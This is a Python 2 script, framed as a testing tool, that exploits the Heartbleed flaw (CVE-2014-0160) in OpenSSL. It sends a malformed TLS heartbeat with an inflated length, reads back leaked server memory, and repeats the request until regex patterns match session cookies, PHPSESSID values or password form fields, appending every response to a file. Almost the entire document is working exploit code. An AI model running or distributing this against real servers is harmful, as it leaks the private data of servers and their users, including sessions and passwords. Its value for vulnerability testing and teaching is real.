#!/usr/bin/env python2
 
# Heart-shaped tool
# =================
 
# Testing tool in demonstration of CVE-2014-0160.
# Heavily derived from code by Jared Stafford (jspenguin@jspenguin.org).
# This version by: @zenoamaro, <zenoamaro at gmail dot com>
 
# Hits the Heartbleed vulnerability on a hostname.
#
# In a heartbeat request, if the claimed payload length is
# larger than the actual length, this will trick a vulnerable
# server into replying with more data than actually sent, as has
# been described in [CVE-2014-0160] as _[heartbleed]_.
#
# [heartbleed]: http://heartbleed.com/
# [CVE-2014-160]: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160
#
# Play with `payload length` to influence where on the heap you
# want your payload to be allocated, and use `claimed length` to
# decide how much data you are trying to receive.
#
# `/` chars will be used as payload content, so if the server is
# vulnerable, and the payload long enough, you will see them
# back in the memory you receive.
#
# You can also grep for regex patterns to try to calculate the
# actual risk of having certain data leaked by your service.
# A common use would be searching for a cookie like `session=\w+;`,
# `PHPSESSID=\w+;`, or form data like `[?&]password[^&]*`, and so on.
#
# Original at: https://gist.github.com/zenoamaro/10560337
 
import re
import sys
import struct
import socket
import time
import select
from datetime import datetime
from optparse import OptionParser
 
# Keep some global settings for simplicity.
class Settings:
    debug = False
    dump_file = None
 
options = OptionParser(
    usage='%prog server[:port] [options]',
    description='Hitter for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-r', '--rev',     type='int', default=2,     help='TLS revision, 1.x (default: 2)')
options.add_option('-p', '--payload', type='int', default=1,     help='Actual payload length (default: 1)')
options.add_option('-l', '--length',  type='int', default=4096,  help='Claimed payload length (default: 4096)')
options.add_option('-w', '--wait',    type='int', default=False, help='Wait given ms after every request')
options.add_option('-g', '--grep',    type='str', default=False, help='Keep searching for regex pattern')
options.add_option('-f', '--file',    type='str', default=False, help='Append all received responses to file')
options.add_option('-d', '--debug',   action='store_true', default=False, help='Enable debug output')
 
FILE_DUMP_TEMPLATE = '''
<---response-[{datetime}]-[{response_length}b]---:
{response}
:--->
'''
 
 
# Utils
# -----
 
def clamp(min_value, value, max_value):
    """ Fixes a value between two bounds, inclusive. """
    return min(max(min_value, value), max_value)
 
def log(msg):
    sys.stderr.write("{}\n".format(msg))
    sys.stderr.flush()
 
def debug(msg):
    if Settings.debug:
        log(msg)
 
def dump_to_file(msg):
    if Settings.dump_file:
        with open(Settings.dump_file, 'a+') as f:
            f.write(FILE_DUMP_TEMPLATE.format(
                response=msg,
                response_length=len(msg),
                datetime=datetime.now(),
            ))
 
def printable(c):
    """ Masks non-printable characters to `.` """
    return c if 32 <= ord(c) <= 126 else '.'
 
def hex2bin(s):
    """ Parses an ASCII hex table into a bytestring """
    return re.sub(r'\s', '', s)\
             .decode('hex')
 
def bin2hex(s):
    """ Transforms a bytestring into an ASCII hex table of width 16 """
    def produce_line(offset):
        line = s[ offset : offset+16 ]
        hex_data = ' '.join( '{:02X}'.format(ord(c)) for c in line )
        str_data =  ''.join( map(printable, line) )
        return '{:04x}: {:<48s} {:s}'.format(offset, hex_data, str_data)
    return '\n'.join( produce_line(offset) for offset in xrange(0, len(s), 16) )
 
def bin2str(s):
    """ Prints the bytestring masking non-printable chars """
    return''.join( map(printable, s) )
 
 
# Payloads
# --------
 
# TLS Heartbeat Hello
# https://tools.ietf.org/html/rfc6520#section-2
HELLO = '''
16 03 {tls_revision:02X} 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01 '''
 
# TLS Heartbeat Request
# https://tools.ietf.org/html/rfc6520#section-4
#     u8 u8 u8, u16: record type, major, minor, record length
#     u8 u16 u8...: request type, payload length, payload...
HEARTBEAT = '''
18 03 {tls_revision:02X} {payload_length:04X}
01 {claimed_length:04X} {payload}
'''
 
def produce_hello(tls_revision):
    tls_revision = clamp(0, tls_revision, 2)
    return hex2bin(HELLO.format(
        tls_revision=tls_revision
    ))
 
def produce_heartbeat(payload_length, claimed_length, tls_revision):
    """
    Will produce a heartbeat message, whose actual payload
    content is `payload_length` bytes long, with a claimed
    length of `claimed_length` bytes.
 
    If the claimed length is larger than the actual payload
    length, this will trick a vulnerable server into replying
    with more data than actually sent, as has been described in
    [CVE-2014-0160] as _[heartbleed]_.
 
    [heartbleed]: http://heartbleed.com/
    [CVE-2014-160]: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160
    """
    overhead = 3 # Account for necessary data
    payload_length = clamp(1, payload_length, 0x4000 - overhead)
    claimed_length = clamp(1, claimed_length, 0xFFFF)
    tls_revision   = clamp(0, tls_revision, 2)
    payload = '2f' * payload_length # `/` character
    message = hex2bin(HEARTBEAT.format(
        tls_revision = tls_revision,
        payload_length = payload_length + overhead,
        claimed_length = claimed_length,
        payload = payload,
    ))
    if Settings.debug:
        debug('Produced this Heartbeat request:')
        debug(bin2hex(message))
    return message
 
 
# Socket communication
# --------------------
 
def connect(host, port=443):
    debug('Connecting to {}:{}...'.format(host, port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock
 
def recv_all(sock, length, timeout=5):
    """ Receive remaining data from the socket, until timeout. """
    response = '' # Final response
    bytes_left = length # Remaning bytes to read
    end_time = time.time() + timeout # Stop at this time
    while bytes_left > 0:
        rtime = end_time - time.time()
        if rtime < 0: # Timeout
            return None
        r, w, e = select.select([sock], [], [], 5)
        if sock in r:
            data = sock.recv(bytes_left)
            if not data: # EOF?
                return None
            response += data
            bytes_left -= len(data)
    return response
 
def recv_msg(sock, forced_length=None):
    """ Receive a whole message, optionally ignoring the response's
        embedded length. """
    header = recv_all(sock, 5) # Header is 5 bytes
    if header is None:
        raise RuntimeError('Server closed connection while receiving record header.')
    typ, ver, length = struct.unpack('>BHH', header)
    # Here we can bypass the server's response, which is
    # often accurately "capped" at 16384 bytes as per spec.
    # We usually won't receive more than 65k here.
    pay = recv_all(sock, forced_length or length, timeout=10)
    if pay is None:
        raise RuntimeError('Server closed connection while receiving record payload.')
    debug('... received message: type={:d}, ver={:04x}, length={:d}'.format(typ, ver, len(pay)))
    return typ, ver, pay
 
 
# TSL and Heartbeat
# -----------------
 
def send_hello(sock, tls_revision=None):
    """ Sends HELLO and waits for response. """
    debug('Sending HELLO...')
    sock.send(produce_hello(tls_revision))
    debug('... waiting for response...')
    while True:
        typ, ver, response = recv_msg(sock)
        if typ == None:
            raise RuntimeError('Server closed connection without replying to Hello.')
        # Look for server HELLO done message.
        if typ == 22 and ord(response[0]) == 0x0E:
            break
 
def send_heartbeat(sock, payload_length=None, claimed_length=None,
                   tls_revision=None):
    """ Sends a Heartbeat requests produced to given
        specifications, and waits for response.
        Returns a `(is_vulnerable, response)` pair."""
    heartbeat = produce_heartbeat(
        payload_length, claimed_length, tls_revision)
    debug('Sending HEARTBEAT request...')
    sock.send(heartbeat)
    debug('... waiting for response...')
    while True:
        typ, ver, response = recv_msg(sock, claimed_length)
        # No response
        if typ is None:
            debug('... no response received.')
            return (False, None)
        # Error response
        elif typ == 21:
            debug('... server returned error.')
            return (False, response)
        # Heartbeat response
        elif typ == 24:
            if len(response) > payload_length +2:
                debug('... response contains more data than it should.')
                return (True, response)
            else:
                debug('... server complied, but did not return any extra data.')
                return (False, response)
        # Keep waiting...
 
 
# Prog
# ----
 
def parse_host(s):
    """ Parses a `host:port` string into a tuple. """
    server = s.split(':')
    host = server[0]
    try:
        port = int(server[1])
    except IndexError:
        port = 443
    return (host, port)
 
def execute(host, port, tls_revision=None,
            payload_length=None, claimed_length=None):
    """ Sends a Heartbeat request to a given host. """
    sock = connect(host, port)
    send_hello(sock, tls_revision)
    is_vuln, response = send_heartbeat(
        sock, payload_length, claimed_length, tls_revision)
    if response:
        dump_to_file(response) # Always dump all payloads to file
    return (is_vuln, response)
 
 
# Command line tool
# -----------------
 
if __name__ == '__main__':
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        sys.exit(-1)
 
    Settings.debug = opts.debug
    Settings.dump_file = opts.file
    grep_pattern = re.compile(opts.grep) if opts.grep else False
    wait_time = (opts.wait / 1000.0) if opts.wait else False
 
    try:
        host, port = parse_host(args[0])
    except ValueError:
        print 'Bad port value: {}.'.format(server[1])
        sys.exit(-1)
 
    matches = None
    requests = 0
 
    while True:
        try:
            is_vuln, response = execute(
                host, port,
                tls_revision=opts.rev,
                payload_length=opts.payload,
                claimed_length=opts.length)
        except Exception as e:
            log("{}".format(e.message))
            # Our journey ends here.
            sys.exit(-1)
        else:
            requests += 1
            if requests % 50 == 0:
                log("{} requests...".format(requests))
        # We are satisfied, break early
        if not is_vuln or not grep_pattern:
            matches = None
            break
        # We are seeking for certain leaked data
        matches = grep_pattern.findall(response)
        if matches:
            break
        # Sleep for some ms before trying again
        if wait_time:
            debug('Waiting {}ms...'.format(int(wait_time * 1000)))
            time.sleep(wait_time)
 
    if is_vuln and response:
        log('Server is vulnerable: it returned more data than it should have!')
        if matches:
            log('Server also leaked the prospected data after {} requests:'.format(requests))
            log( '\n'.join( '- {}'.format(match) for match in matches ) )
        # Dump the response
        debug('Here is the full response:')
        debug(bin2hex(response))
 
    else:
        log('Server appears not to be vulnerable.')
